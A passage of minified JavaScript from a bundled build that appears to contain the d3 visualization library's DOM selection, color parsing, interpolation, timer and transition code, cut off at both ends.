t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),Dc.hasOwnProperty(n)?{space:Dc[n],local:e}:e}function oy(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===el&&n.documentElement.namespaceURI===el?n.createElement(e):n.createElementNS(t,e)}}function cy(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function Td(e){var n=Ei(e);return(n.local?cy:oy)(n)}function uy(){}function oo(e){return e==null?uy:function(){return this.querySelector(e)}}function py(e){typeof e!="function"&&(e=oo(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,u=0;u<a;++u)(o=i[u])&&(c=e.call(o,o.__data__,u,i))&&("__data__"in o&&(c.__data__=o.__data__),l[u]=c);return new Re(s,this._parents)}function dy(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function hy(){return[]}function Cd(e){return e==null?hy:function(){return this.querySelectorAll(e)}}function fy(e){return function(){return dy(e.apply(this,arguments))}}function my(e){typeof e=="function"?e=fy(e):e=Cd(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new Re(s,r)}function Pd(e){return function(){return this.matches(e)}}function Ad(e){return function(n){return n.matches(e)}}var gy=Array.prototype.find;function yy(e){return function(){return gy.call(this.children,e)}}function vy(){return this.firstElementChild}function wy(e){return this.select(e==null?vy:yy(typeof e=="function"?e:Ad(e)))}var ky=Array.prototype.filter;function by(){return Array.from(this.children)}function xy(e){return function(){return ky.call(this.children,e)}}function Sy(e){return this.selectAll(e==null?by:xy(typeof e=="function"?e:Ad(e)))}function _y(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new Re(s,this._parents)}function Ld(e){return new Array(e.length)}function Ey(){return new Re(this._enter||this._groups.map(Ld),this._parents)}function ti(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}ti.prototype={constructor:ti,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function Ty(e){return function(){return e}}function Cy(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new ti(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function Py(e,n,t,s,r,i,a){var l,o,c=new Map,u=n.length,h=i.length,f=new Array(u),v;for(l=0;l<u;++l)(o=n[l])&&(f[l]=v=a.call(o,o.__data__,l,n)+"",c.has(v)?r[l]=o:c.set(v,o));for(l=0;l<h;++l)v=a.call(e,i[l],l,i)+"",(o=c.get(v))?(s[l]=o,o.__data__=i[l],c.delete(v)):t[l]=new ti(e,i[l]);for(l=0;l<u;++l)(o=n[l])&&c.get(f[l])===o&&(r[l]=o)}function Ay(e){return e.__data__}function Ly(e,n){if(!arguments.length)return Array.from(this,Ay);var t=n?Py:Cy,s=this._parents,r=this._groups;typeof e!="function"&&(e=Ty(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var u=s[c],h=r[c],f=h.length,v=Ny(e.call(u,u&&u.__data__,c,s)),b=v.length,g=l[c]=new Array(b),x=a[c]=new Array(b),p=o[c]=new Array(f);t(u,h,g,x,p,v,n);for(var d=0,m=0,w,S;d<b;++d)if(w=g[d]){for(d>=m&&(m=d+1);!(S=x[m])&&++m<b;);w._next=S||null}}return a=new Re(a,s),a._enter=l,a._exit=o,a}function Ny(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function Ry(){return new Re(this._exit||this._groups.map(Ld),this._parents)}function Oy(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function My(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],u=s[o],h=c.length,f=l[o]=new Array(h),v,b=0;b<h;++b)(v=c[b]||u[b])&&(f[b]=v);for(;o<r;++o)l[o]=t[o];return new Re(l,this._parents)}function Iy(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function zy(e){e||(e=Dy);function n(h,f){return h&&f?e(h.__data__,f.__data__):!h-!f}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,u=0;u<l;++u)(c=a[u])&&(o[u]=c);o.sort(n)}return new Re(r,this._parents).order()}function Dy(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function jy(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function By(){return Array.from(this)}function Fy(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function Uy(){let e=0;for(const n of this)++e;return e}function Hy(){return!this.node()}function Vy(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function Wy(e){return function(){this.removeAttribute(e)}}function $y(e){return function(){this.removeAttributeNS(e.space,e.local)}}function Gy(e,n){return function(){this.setAttribute(e,n)}}function qy(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function Yy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function Xy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function Ky(e,n){var t=Ei(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?$y:Wy:typeof n=="function"?t.local?Xy:Yy:t.local?qy:Gy)(t,n))}function Nd(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function Qy(e){return function(){this.style.removeProperty(e)}}function Zy(e,n,t){return function(){this.style.setProperty(e,n,t)}}function Jy(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function ev(e,n,t){return arguments.length>1?this.each((n==null?Qy:typeof n=="function"?Jy:Zy)(e,n,t??"")):Bt(this.node(),e)}function Bt(e,n){return e.style.getPropertyValue(n)||Nd(e).getComputedStyle(e,null).getPropertyValue(n)}function nv(e){return function(){delete this[e]}}function tv(e,n){return function(){this[e]=n}}function sv(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function rv(e,n){return arguments.length>1?this.each((n==null?nv:typeof n=="function"?sv:tv)(e,n)):this.node()[e]}function Rd(e){return e.trim().split(/^|\s+/)}function co(e){return e.classList||new Od(e)}function Od(e){this._node=e,this._names=Rd(e.getAttribute("class")||"")}Od.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function Md(e,n){for(var t=co(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function Id(e,n){for(var t=co(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function iv(e){return function(){Md(this,e)}}function av(e){return function(){Id(this,e)}}function lv(e,n){return function(){(n.apply(this,arguments)?Md:Id)(this,e)}}function ov(e,n){var t=Rd(e+"");if(arguments.length<2){for(var s=co(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?lv:n?iv:av)(t,n))}function cv(){this.textContent=""}function uv(e){return function(){this.textContent=e}}function pv(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function dv(e){return arguments.length?this.each(e==null?cv:(typeof e=="function"?pv:uv)(e)):this.node().textContent}function hv(){this.innerHTML=""}function fv(e){return function(){this.innerHTML=e}}function mv(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function gv(e){return arguments.length?this.each(e==null?hv:(typeof e=="function"?mv:fv)(e)):this.node().innerHTML}function yv(){this.nextSibling&&this.parentNode.appendChild(this)}function vv(){return this.each(yv)}function wv(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function kv(){return this.each(wv)}function bv(e){var n=typeof e=="function"?e:Td(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function xv(){return null}function Sv(e,n){var t=typeof e=="function"?e:Td(e),s=n==null?xv:typeof n=="function"?n:oo(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function _v(){var e=this.parentNode;e&&e.removeChild(this)}function Ev(){return this.each(_v)}function Tv(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Cv(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Pv(e){return this.select(e?Cv:Tv)}function Av(e){return arguments.length?this.property("__data__",e):this.node().__data__}function Lv(e){return function(n){e.call(this,n,this.__data__)}}function Nv(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function Rv(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function Ov(e,n,t){return function(){var s=this.__on,r,i=Lv(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function Mv(e,n,t){var s=Nv(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,u;o<c;++o)for(r=0,u=l[o];r<i;++r)if((a=s[r]).type===u.type&&a.name===u.name)return u.value}return}for(l=n?Ov:Rv,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function zd(e,n,t){var s=Nd(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function Iv(e,n){return function(){return zd(this,e,n)}}function zv(e,n){return function(){return zd(this,e,n.apply(this,arguments))}}function Dv(e,n){return this.each((typeof n=="function"?zv:Iv)(e,n))}function*jv(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var Dd=[null];function Re(e,n){this._groups=e,this._parents=n}function Gs(){return new Re([[document.documentElement]],Dd)}function Bv(){return this}Re.prototype=Gs.prototype={constructor:Re,select:py,selectAll:my,selectChild:wy,selectChildren:Sy,filter:_y,data:Ly,enter:Ey,exit:Ry,join:Oy,merge:My,selection:Bv,order:Iy,sort:zy,call:jy,nodes:By,node:Fy,size:Uy,empty:Hy,each:Vy,attr:Ky,style:ev,property:rv,classed:ov,text:dv,html:gv,raise:vv,lower:kv,append:bv,insert:Sv,remove:Ev,clone:Pv,datum:Av,on:Mv,dispatch:Dv,[Symbol.iterator]:jv};function Tn(e){return typeof e=="string"?new Re([[document.querySelector(e)]],[document.documentElement]):new Re([[e]],Dd)}function Fv(e){let n;for(;n=e.sourceEvent;)e=n;return e}function $n(e,n){if(e=Fv(e),n===void 0&&(n=e.currentTarget),n){var t=n.ownerSVGElement||n;if(t.createSVGPoint){var s=t.createSVGPoint();return s.x=e.clientX,s.y=e.clientY,s=s.matrixTransform(n.getScreenCTM().inverse()),[s.x,s.y]}if(n.getBoundingClientRect){var r=n.getBoundingClientRect();return[e.clientX-r.left-n.clientLeft,e.clientY-r.top-n.clientTop]}}return[e.pageX,e.pageY]}const nl={capture:!0,passive:!1};function tl(e){e.preventDefault(),e.stopImmediatePropagation()}function Uv(e){var n=e.document.documentElement,t=Tn(e).on("dragstart.drag",tl,nl);"onselectstart"in n?t.on("selectstart.drag",tl,nl):(n.__noselect=n.style.MozUserSelect,n.style.MozUserSelect="none")}function Hv(e,n){var t=e.document.documentElement,s=Tn(e).on("dragstart.drag",null);n&&(s.on("click.drag",tl,nl),setTimeout(function(){s.on("click.drag",null)},0)),"onselectstart"in t?s.on("selectstart.drag",null):(t.style.MozUserSelect=t.__noselect,delete t.__noselect)}function uo(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function jd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function qs(){}var Is=.7,si=1/Is,Nt="\\s*([+-]?\\d+)\\s*",zs="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",tn="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",Vv=/^#([0-9a-f]{3,8})$/,Wv=new RegExp(`^rgb\\(${Nt},${Nt},${Nt}\\)$`),$v=new RegExp(`^rgb\\(${tn},${tn},${tn}\\)$`),Gv=new RegExp(`^rgba\\(${Nt},${Nt},${Nt},${zs}\\)$`),qv=new RegExp(`^rgba\\(${tn},${tn},${tn},${zs}\\)$`),Yv=new RegExp(`^hsl\\(${zs},${tn},${tn}\\)$`),Xv=new RegExp(`^hsla\\(${zs},${tn},${tn},${zs}\\)$`),jc={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};uo(qs,Ds,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Bc,formatHex:Bc,formatHex8:Kv,formatHsl:Qv,formatRgb:Fc,toString:Fc});function Bc(){return this.rgb().formatHex()}function Kv(){return this.rgb().formatHex8()}function Qv(){return Bd(this).formatHsl()}function Fc(){return this.rgb().formatRgb()}function Ds(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=Vv.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?Uc(n):t===3?new _e(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?pr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?pr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=Wv.exec(e))?new _e(n[1],n[2],n[3],1):(n=$v.exec(e))?new _e(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=Gv.exec(e))?pr(n[1],n[2],n[3],n[4]):(n=qv.exec(e))?pr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=Yv.exec(e))?Wc(n[1],n[2]/100,n[3]/100,1):(n=Xv.exec(e))?Wc(n[1],n[2]/100,n[3]/100,n[4]):jc.hasOwnProperty(e)?Uc(jc[e]):e==="transparent"?new _e(NaN,NaN,NaN,0):null}function Uc(e){return new _e(e>>16&255,e>>8&255,e&255,1)}function pr(e,n,t,s){return s<=0&&(e=n=t=NaN),new _e(e,n,t,s)}function Zv(e){return e instanceof qs||(e=Ds(e)),e?(e=e.rgb(),new _e(e.r,e.g,e.b,e.opacity)):new _e}function sl(e,n,t,s){return arguments.length===1?Zv(e):new _e(e,n,t,s??1)}function _e(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}uo(_e,sl,jd(qs,{brighter(e){return e=e==null?si:Math.pow(si,e),new _e(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?Is:Math.pow(Is,e),new _e(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new _e(et(this.r),et(this.g),et(this.b),ri(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Hc,formatHex:Hc,formatHex8:Jv,formatRgb:Vc,toString:Vc}));function Hc(){return`#${Qn(this.r)}${Qn(this.g)}${Qn(this.b)}`}function Jv(){return`#${Qn(this.r)}${Qn(this.g)}${Qn(this.b)}${Qn((isNaN(this.opacity)?1:this.opacity)*255)}`}function Vc(){const e=ri(this.opacity);return`${e===1?"rgb(":"rgba("}${et(this.r)}, ${et(this.g)}, ${et(this.b)}${e===1?")":`, ${e})`}`}function ri(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function et(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function Qn(e){return e=et(e),(e<16?"0":"")+e.toString(16)}function Wc(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new Ge(e,n,t,s)}function Bd(e){if(e instanceof Ge)return new Ge(e.h,e.s,e.l,e.opacity);if(e instanceof qs||(e=Ds(e)),!e)return new Ge;if(e instanceof Ge)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new Ge(a,l,o,e.opacity)}function e0(e,n,t,s){return arguments.length===1?Bd(e):new Ge(e,n,t,s??1)}function Ge(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}uo(Ge,e0,jd(qs,{brighter(e){return e=e==null?si:Math.pow(si,e),new Ge(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?Is:Math.pow(Is,e),new Ge(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new _e(ta(e>=240?e-240:e+120,r,s),ta(e,r,s),ta(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new Ge($c(this.h),dr(this.s),dr(this.l),ri(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=ri(this.opacity);return`${e===1?"hsl(":"hsla("}${$c(this.h)}, ${dr(this.s)*100}%, ${dr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function $c(e){return e=(e||0)%360,e<0?e+360:e}function dr(e){return Math.max(0,Math.min(1,e||0))}function ta(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Fd=e=>()=>e;function n0(e,n){return function(t){return e+t*n}}function t0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function s0(e){return(e=+e)==1?Ud:function(n,t){return t-n?t0(n,t,e):Fd(isNaN(n)?t:n)}}function Ud(e,n){var t=n-e;return t?n0(e,t):Fd(isNaN(e)?n:e)}const Gc=function e(n){var t=s0(n);function s(r,i){var a=t((r=sl(r)).r,(i=sl(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Ud(r.opacity,i.opacity);return function(u){return r.r=a(u),r.g=l(u),r.b=o(u),r.opacity=c(u),r+""}}return s.gamma=e,s}(1);function Sn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var rl=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,sa=new RegExp(rl.source,"g");function r0(e){return function(){return e}}function i0(e){return function(n){return e(n)+""}}function a0(e,n){var t=rl.lastIndex=sa.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=rl.exec(e))&&(r=sa.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:Sn(s,r)})),t=sa.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?i0(o[0].x):r0(n):(n=o.length,function(c){for(var u=0,h;u<n;++u)l[(h=o[u]).i]=h.x(c);return l.join("")})}var qc=180/Math.PI,il={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Hd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*qc,skewX:Math.atan(o)*qc,scaleX:a,scaleY:l}}var hr;function l0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?il:Hd(n.a,n.b,n.c,n.d,n.e,n.f)}function o0(e){return e==null||(hr||(hr=document.createElementNS("http://www.w3.org/2000/svg","g")),hr.setAttribute("transform",e),!(e=hr.transform.baseVal.consolidate()))?il:(e=e.matrix,Hd(e.a,e.b,e.c,e.d,e.e,e.f))}function Vd(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,u,h,f,v,b){if(c!==h||u!==f){var g=v.push("translate(",null,n,null,t);b.push({i:g-4,x:Sn(c,h)},{i:g-2,x:Sn(u,f)})}else(h||f)&&v.push("translate("+h+n+f+t)}function a(c,u,h,f){c!==u?(c-u>180?u+=360:u-c>180&&(c+=360),f.push({i:h.push(r(h)+"rotate(",null,s)-2,x:Sn(c,u)})):u&&h.push(r(h)+"rotate("+u+s)}function l(c,u,h,f){c!==u?f.push({i:h.push(r(h)+"skewX(",null,s)-2,x:Sn(c,u)}):u&&h.push(r(h)+"skewX("+u+s)}function o(c,u,h,f,v,b){if(c!==h||u!==f){var g=v.push(r(v)+"scale(",null,",",null,")");b.push({i:g-4,x:Sn(c,h)},{i:g-2,x:Sn(u,f)})}else(h!==1||f!==1)&&v.push(r(v)+"scale("+h+","+f+")")}return function(c,u){var h=[],f=[];return c=e(c),u=e(u),i(c.translateX,c.translateY,u.translateX,u.translateY,h,f),a(c.rotate,u.rotate,h,f),l(c.skewX,u.skewX,h,f),o(c.scaleX,c.scaleY,u.scaleX,u.scaleY,h,f),c=u=null,function(v){for(var b=-1,g=f.length,x;++b<g;)h[(x=f[b]).i]=x.x(v);return h.join("")}}}var c0=Vd(l0,"px, ","px)","deg)"),u0=Vd(o0,", ",")",")"),p0=1e-12;function Yc(e){return((e=Math.exp(e))+1/e)/2}function d0(e){return((e=Math.exp(e))-1/e)/2}function h0(e){return((e=Math.exp(2*e))-1)/(e+1)}const f0=function e(n,t,s){function r(i,a){var l=i[0],o=i[1],c=i[2],u=a[0],h=a[1],f=a[2],v=u-l,b=h-o,g=v*v+b*b,x,p;if(g<p0)p=Math.log(f/c)/n,x=function(P){return[l+P*v,o+P*b,c*Math.exp(n*P*p)]};else{var d=Math.sqrt(g),m=(f*f-c*c+s*g)/(2*c*t*d),w=(f*f-c*c-s*g)/(2*f*t*d),S=Math.log(Math.sqrt(m*m+1)-m),T=Math.log(Math.sqrt(w*w+1)-w);p=(T-S)/n,x=function(P){var N=P*p,B=Yc(S),D=c/(t*d)*(B*h0(n*N+S)-d0(S));return[l+D*v,o+D*b,c*B/Yc(n*N+S)]}}return x.duration=p*1e3*n/Math.SQRT2,x}return r.rho=function(i){var a=Math.max(.001,+i),l=a*a,o=l*l;return e(a,l,o)},r}(Math.SQRT2,2,4);var Ft=0,is=0,Jt=0,Wd=1e3,ii,as,ai=0,at=0,Ti=0,js=typeof performance=="object"&&performance.now?performance:Date,$d=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function po(){return at||($d(m0),at=js.now()+Ti)}function m0(){at=0}function li(){this._call=this._time=this._next=null}li.prototype=Gd.prototype={constructor:li,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?po():+t)+(n==null?0:+n),!this._next&&as!==this&&(as?as._next=this:ii=this,as=this),this._call=e,this._time=t,al()},stop:function(){this._call&&(this._call=null,this._time=1/0,al())}};function Gd(e,n,t){var s=new li;return s.restart(e,n,t),s}function g0(){po(),++Ft;for(var e=ii,n;e;)(n=at-e._time)>=0&&e._call.call(void 0,n),e=e._next;--Ft}function Xc(){at=(ai=js.now())+Ti,Ft=is=0;try{g0()}finally{Ft=0,v0(),at=0}}function y0(){var e=js.now(),n=e-ai;n>Wd&&(Ti-=n,ai=e)}function v0(){for(var e,n=ii,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:ii=t);as=e,al(s)}function al(e){if(!Ft){is&&(is=clearTimeout(is));var n=e-at;n>24?(e<1/0&&(is=setTimeout(Xc,e-js.now()-Ti)),Jt&&(Jt=clearInterval(Jt))):(Jt||(ai=js.now(),Jt=setInterval(y0,Wd)),Ft=1,$d(Xc))}}function Kc(e,n,t){var s=new li;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var w0=lo("start","end","cancel","interrupt"),k0=[],qd=0,Qc=1,ll=2,Pr=3,Zc=4,ol=5,Ar=6;function Ci(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else if(t in a)return;b0(e,t,{name:n,index:s,group:r,on:w0,tween:k0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:qd})}function ho(e,n){var t=Ke(e,n);if(t.state>qd)throw new Error("too late; already scheduled");return t}function sn(e,n){var t=Ke(e,n);if(t.state>Pr)throw new Error("too late; already running");return t}function Ke(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function b0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=Gd(i,0,t.time);function i(c){t.state=Qc,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var u,h,f,v;if(t.state!==Qc)return o();for(u in s)if(v=s[u],v.name===t.name){if(v.state===Pr)return Kc(a);v.state===Zc?(v.state=Ar,v.timer.stop(),v.on.call("interrupt",e,e.__data__,v.index,v.group),delete 